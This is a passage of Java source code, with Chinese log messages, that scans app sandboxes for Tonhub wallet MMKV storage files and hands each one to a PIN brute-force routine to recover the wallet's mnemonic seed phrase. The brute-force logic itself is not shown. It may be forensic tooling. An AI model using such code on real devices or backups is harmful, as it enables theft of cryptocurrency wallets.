                        && p.toString().replace('\\', '/').contains("/Documents/mmkv/mmkv.default"))
                 .forEach(extras::add);
            }
            for (Path cand : extras) {
                if (triedPaths.contains(cand)) continue; // 跳过已尝试的 variant
                if (!Files.isRegularFile(cand)) continue;
                byte[] blob;
                try { blob = Files.readAllBytes(cand); }
                catch (IOException e) { log.warn("【mnemonic】tonhub glob 读取 {} 失败 ctx_id={} err={}", cand, ctxId, e.toString()); continue; }
                if (blob == null || blob.length == 0) continue;
                // 从路径里反推出 variant 名（sandbox/xxx/Documents/... 取 xxx）
                Path sandboxRel = sandbox.relativize(cand);
                String dirGuess = (sandboxRel.getNameCount() >= 1) ? sandboxRel.getName(0).toString() : "unknown";
                PhraseResult r = tonhubPinBrute(blob, ctx);
                if (r != null) { out.add(r); return; }
                log.warn("【mnemonic】tonhub glob 路径 {}（ctx_id={}）已执行但无结果", cand, ctxId);
                // 异步模式：暴力任务已提交到后台，不再尝试其他文件
                if (asyncMode) return;
            }
        } catch (IOException e) {
            log.warn("【mnemonic】tonhub glob 扫描 sandbox 失败 ctx_id={} sandbox={} err={}", ctxId, sandbox, e.toString());
        }
    }
}
